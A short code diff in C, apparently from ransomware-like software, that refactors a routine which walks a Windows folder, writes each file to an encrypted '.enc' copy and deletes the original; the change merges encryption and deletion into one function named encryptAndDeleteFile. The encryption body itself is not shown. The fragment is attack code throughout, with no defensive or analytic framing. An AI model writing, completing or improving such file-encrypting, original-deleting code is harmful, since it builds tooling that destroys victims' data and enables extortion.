@@ -88,15 +88,14 @@ iterateFolder(char initialPath[]) {
 				strcpy(encryptedFilePath, fullFilePath);
 				strcat(encryptedFilePath, ".enc");
 				printf("%s\r\n", fullFilePath);
-				encryptFile(fullFilePath, encryptedFilePath);
-				remove(fullFilePath);
+				encryptAndDeleteFile(fullFilePath, encryptedFilePath);
 			}
 		}
 	} while (FindNextFile(hFind, &fdata));
 	FindClose(hFind);
 }
 
-encryptFile(char sourceFilePath[], char destitationFilePath[]) {
+encryptAndDeleteFile(char sourceFilePath[], char destitationFilePath[]) {
 	FILE *sourceFile = fopen(sourceFilePath, "rb");
 	FILE *destinationFile = fopen(destitationFilePath, "wb");
 
@@ -114,6 +113,7 @@ encryptFile(char sourceFilePath[], char destitationFilePath[]) {
 
 	fclose(sourceFile);
 	fclose(destinationFile);
+	remove(sourceFilePath);
 }
 
 decryptFile(char sourceFilePath[], char destitationFilePath[]) {
